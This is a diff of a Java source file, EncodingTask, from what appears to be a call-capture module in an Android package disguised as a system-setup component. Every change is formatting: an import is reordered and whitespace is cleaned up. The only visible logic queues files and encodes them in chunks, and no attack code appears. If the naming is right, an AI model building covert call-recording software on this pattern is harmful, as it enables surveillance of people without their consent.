@@ -1,7 +1,5 @@
 package com.android.syssetup.module.call;
 
-import java.util.concurrent.BlockingQueue;
-
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.file.AutoFile;
@@ -10,12 +8,14 @@ import com.android.syssetup.listener.ListenerProcess;
 import com.android.syssetup.module.ModuleCall;
 import com.android.syssetup.util.Check;
 
+import java.util.concurrent.BlockingQueue;
+
 public class EncodingTask implements Runnable, Observer<ProcessInfo> {
 	/**
-	 * 
+	 *
 	 */
 	private static final String TAG = "EncodingTask";
-	
+
 	private final ModuleCall moduleCall;
 	Object sync;
 	BlockingQueue<String> queue;
@@ -39,7 +39,7 @@ public class EncodingTask implements Runnable, Observer<ProcessInfo> {
 		synchronized (sync) {
 			try {
 				sync.notify();
-			} catch (IllegalMonitorStateException e){
+			} catch (IllegalMonitorStateException e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
@@ -56,7 +56,7 @@ public class EncodingTask implements Runnable, Observer<ProcessInfo> {
 					if (Cfg.EXCEPTION) {
 						Check.log(e);
 					}
-				} catch (IllegalMonitorStateException e){
+				} catch (IllegalMonitorStateException e) {
 					if (Cfg.EXCEPTION) {
 						Check.log(e);
 					}
@@ -86,7 +86,7 @@ public class EncodingTask implements Runnable, Observer<ProcessInfo> {
 						Check.log(TAG + "(EncodingTask run): decoding " + file.getName());
 					}
 
-		
+
 					this.moduleCall.encodeChunks(file);
 
 				}
